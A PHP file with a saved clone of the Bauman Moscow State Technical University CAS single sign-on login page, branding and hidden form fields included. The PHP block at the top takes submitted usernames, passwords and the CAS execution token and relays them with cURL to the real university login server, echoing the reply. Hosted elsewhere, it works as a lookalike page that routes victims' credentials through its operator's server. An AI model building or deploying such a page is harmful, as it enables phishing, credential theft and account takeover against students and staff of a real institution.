<?php

// Проверяем, был ли получен POST-запрос
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $url = 'https://proxy.bmstu.ru:8443/cas/login';
    $data = array(
        'username' => $_POST['username'],
        'password' => $_POST['password'],
        'execution' => $_POST['execution'],
        '_eventId' => $_POST['_eventId'],
        'geolocation' => $_POST['geolocation'],
    );
    $headers = array(
        'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    );
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);
    echo '<pre>';
    echo $response;
    exit();
}

?>
<!DOCTYPE html>
<html class=" js no-mobile desktop no-ie chrome chrome118 cas-section w-1022 gt-240 gt-320 gt-480 gt-640 gt-768 gt-800 lt-1024 lt-1280 lt-1440 lt-1680 lt-1920 no-portrait landscape gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius cssreflections csstransforms csstransitions no-touch retina fontface domloaded"
      id="login-page" data-lt-installed="true" foxified="">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>ЕДИНАЯ СЛУЖБА АУТЕНТИФИКАЦИИ | МГТУ им.Баумана - CAS – Central Authentication Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet"
          href="form/font-awesome.min.css">
    <link type="text/css" rel="stylesheet"
          href="form/bootstrap.min.css">
    <link rel="stylesheet"
          href="form/cas.css">
    <link rel="icon" href="https://proxy.bmstu.ru:8443/cas/favicon.ico" type="image/x-icon">
    <script async=""
            src="form/analytics.js.Без названия"></script>
    <script type="text/javascript"
            src="form/zxcvbn.js.Без названия"></script>
    <script type="text/javascript"
            src="form/jquery.min.js.Без названия"></script>
    <script type="text/javascript"
            src="form/jquery-ui.min.js.Без названия"></script>
    <script type="text/javascript"
            src="form/jquery.cookie.min.js.Без названия"></script>
    <script src="form/bootstrap.min.js.Без названия"></script>

    <script type="text/javascript"
            src="form/c7fa7451-6f95-4815-ac32-b8cc2537837a"
            data-awssuidacr="12H5uuxHOrlDqmXZrdcp37LZBP77lLRN"></script>
    <script type="text/javascript" async=""
            src="form/taas"></script>
    <script src="form/js"
            async=""></script>
</head>

<body id="cas" class="login" wfd-invisible="true">
<div id="container" class="container">
    <header>
        <!--<a id="logo" href="http://www.apereo.org" th:title="#{logo.title}">Apereo</a>
        <h1>Apereo Central Authentication Service (CAS)</h1>--></header>
    <div id="content">
        <div class="row">
            <div id="notices" class="col-sm-12 col-md-6 col-md-push-6" style="display: none;" wfd-invisible="true">
                <div id="cookiesDisabled" class="alert alert-info" style="display:none;" wfd-invisible="true">
                    <h2>Browser cookies disabled</h2>
                    <p>Your browser does not accept cookies. Single Sign On WILL NOT WORK.</p>
                </div>
                <div class="well well-lg hidden-xs">
                    <h3>Links to CAS Resources</h3>
                    <ul class="list-group">
                        <li class="list-group-item">
                            <a href="https://proxy.bmstu.ru:8443/cas/status/dashboard">
                                <i class="fa fa-cogs"></i> Dashboard
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="http://apereo.github.io/cas">
                                <i class="fa fa-file"></i> Documentation
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="https://github.com/apereo/cas/issues">
                                <i class="fa fa-bug"></i> Issue Tracker
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="https://apereo.github.io/cas/Mailing-Lists.html">
                                <i class="fa fa-envelope"></i> Mailing Lists
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="https://gitter.im/apereo/cas">
                                <i class="fa fa-commenting-o"></i> Chatroom
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="https://apereo.github.io/">
                                <i class="fa fa-rss"></i> Blog
                            </a>
                        </li>


                    </ul>
                </div>
            </div>
            <div class="col-sm-12 col-md-6 col-md-push-3">
                <div class="box" id="login">
                    <div class="login-header">
                        <h2>ЕДИНАЯ СЛУЖБА WEB АУТЕНТИФИКАЦИИ</h2>
                        <img src="form/bmstu_logo.png"
                             class="img-responsible" width="140"></div>

                    <form method="post" id="fm1">

                        <h2 wfd-invisible="true">Введите логин и пароль</h2>

                        <section class="row">
                            <label for="username"><span class="accesskey">Л</span>огин:</label>

                            <div>
                                <input class="required" id="username" size="25" tabindex="1" type="text" accesskey="л"
                                       autocomplete="off" name="username" value=""></div>
                        </section>

                        <section class="row">
                            <label for="password"><span class="accesskey">П</span>ароль:</label>

                            <div>
                                <input class="required" type="password" id="password" size="25" tabindex="2"
                                       accesskey="п" autocomplete="off" name="password" value=""><span id="capslock-on"
                                                                                                       style="display:none;"
                                                                                                       wfd-invisible="true">
                    <p>
                        <i class="fa fa-exclamation-circle"></i>
                        <span>CAPSLOCK key is turned on!</span>
                    </p>
                </span>
                            </div>
                        </section>

                        <section class="row check">
                        </section>

                        <section class="row btn-row">
                            <input type="hidden" name="execution"
                                   value="6ce85807-ace9-4d26-b8ff-8cae1a15f283_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuY2xaUWRYSkJVRlpKVTFSaUwxRmtURGhLVVhaeVQxSk5XbGxXZVhjeFUyMXZjamhaYlhGcVpEUnZaMEZDSzNweWVHWjZlRVJyWkhsaFkzWmplRGt3TlVOaVJteDVZMU5uUWtkdWVWVXdTMnRuTWpOeFNVTkdRamxRYmxGV04zSnpSRFpuTUU5SFRtdGlLMUpOV2pWS1RYbHZiMVowV2xoSU5tOXBWRWxOVFZWNmJHOTRkRGh3V1dwRk1XZHFSMFE0ZHpaWllVZ3liR1UwWm1ZcmRUSmFhVnB2Wm1SQmJqWXdSV1J4WkZwck5XcDNUV1JQUlUxM1JtOXlTVE5SZFZwM2VtRnZiM1ZaZFZOMU0xZGxWa3hXWkd4NldVaExiR2x5Y2xwR1kwcHJabEZOTlcxNlJXRmxaVUpvU1RCNWNpdFNMMkZWUmtOaE5tODFXVmRLTlVWbE1uZzRlR2cxZGpGRk9ITnlTMWw0TUVOVWVWQkZaak50UjJ4SVNVeERjSFFyZFRjMWRGSlNLek4yVkd4cVNXcHFhMEl6YW1SdGVXRlNhMGhTVkZvMU5tTnZVR3BIYTJweGVXcHlhU3RCUTBaWFRIWXlVVEl6VG10Nk0xQTFRV3M1U0ZSMk1uZE1VV1ZpZEVKV1NISnhUVEJaTUM5NWJTOWFhMlUyUWprM1IwUkZURGhIUmtGaVptMW1WRVZsTlRWTlJsUmFUREEzY3pkSGJYUnJNSFJ0VmtWNWNEVXhjR0Z5WVdjd05FeG5TR05hVTBkSFIzQnRTVTVJY2l0b1JYUXhiamRVWWs5eU4xWldhV0l4VEhFM05FVXdSSEp5WTFGc1oycDZWbEZ6YkdZNGJsTnlWMXBhUmk5cVpsQlFRWFk1TjJObFpDdHJSVFpvZW1FMk1uZFRXV0pSWjBOTlRVWjFWVkZ2T1ZOMUsyVm9SMnBRZVRGMVNrSXJVR00xUldNcmEwVmFhbFpDZWpWVWVqbDBkM3BJY2xkSlpreFVjMlYyTDBGNE1YSTNVVkZJUWlzMFExSTNNWFV2YzFwVFNtTXZZWEJhU1RoaWFUVkNWbEZUUVdFNGFDdE9ZVVJ0UlZGcFIwWlpSRGRQU0dRNVVWQlBVaTl4V2pGRVVWQmhjVXhMV1RGR0wwZFdXR041ZWk5WFVsRXhTRGx2VjFjNFQxSnNhVElyVDNCQkswSlZjRm8zV2tnM1IzbEJNR0Y2TkdORGIySjZiSEYxT1U5R2VVNVZTemR0T1hJd2NIVkVjbEYyUjJkdU9ISllibU0yVEZSRFpVZDBPRWhsY25aSk5URnZlbGx6VDJkS1VqZGtTWFJ6T0VkblNHTTFhbmR3U21OUFNqbFhTR1JuTkZFNFJEbHJVV3hUUjFaalMzcHBSbEJwU0RZM2J6RnBTM1J2Y0V0SVNubElaelZ6VnpSdGJXTXpTbWxQVlhNNWJqZHFhemhtUW14WFNtOTRhME14TkZOVVdGTkJialJLWkVOaVlWcDJRM2hsTnpKRmNrNVVhbFJNUmpSMmFVZDNhRGQ2Tm1NeWJVMTVkalUwV1RkblpVSkhXV0pSZEVabFdtSm9kV3QyTVhoVlpUbExlblEwU0ZGR04zbFRSVWxYTVVGTVZYWjZVa1E0UzNOSFZqTXhkRGhSZWtaQ1R5OHhNVGRNU1hSVFJrVXlhSEV3VDFWaU9VUnFOblZCUnpWTkt6TkdjVVJVUjBWQ1REZDJNR0ZXUjB4clkwSjZhR1pUWnpGVldIWXJXbmxSTkRKTGFHWTFWbXBsUmxaNk5XTjVSa3NyTkZsYWEwNXhPVE51WkVGMmNVRk1WVGxNUWpsU2NsTlBia3haZFVodll6VmFXV1JKTVdjOVBRLnM4SUF1TzFlTEptVFZKeUJVa1RTSTZPYzMtVGxsdVlvc1BmQnI2WnozUHNoTzVCbV8waDdraEhuY1k4S1YwM294WTBNUV9BbnlEM1BVOGhJQm9iQkZB"
                                   wfd-invisible="true"><input type="hidden" name="_eventId" value="submit"
                                                               wfd-invisible="true"><input type="hidden"
                                                                                           name="geolocation"
                                                                                           wfd-invisible="true"><input
                                    class="btn btn-submit btn-block" name="submit" accesskey="l" value="ВОЙТИ"
                                    tabindex="6" type="submit"></section>
                    </form>

                    <div>
                        <span class="fa fa-question-circle"></span>
                        <span><a href="https://pwd.example.org/">Forgot your password? </a></span>
                        <p></p></div>

                    <script type="text/javascript" wfd-invisible="true">
                        var i = "One moment please..."
                        $("#fm1").submit(function () {
                            $(":submit").attr("disabled", true);
                            $(":submit").attr("value", i);
                            return true;
                        });
                    </script>
                    <!--    <div th:replace="fragments/loginsidebar"/> --></div>
            </div>
        </div>
    </div>
    <footer style="text-align: center; font-size: 0.8em;">
        <span>Оформлено и разработано в УИ-ВЦ МГТУ им. Н.Э.Баумана.</span><br>
        <span>По вопросам работы сервиса обращайтесь на адрес support@bmstu.ru</span>
    </footer>
</div>
<div>
    <script src="form/head.min.js.Без названия"
            wfd-invisible="true"></script>
    <script type="text/javascript"
            src="form/cas.js.Без названия"
            wfd-invisible="true"></script>


</div>


<iframe src="form/saved_resource.html"
        style="display: none;" wfd-invisible="true"></iframe>
</body>
</html>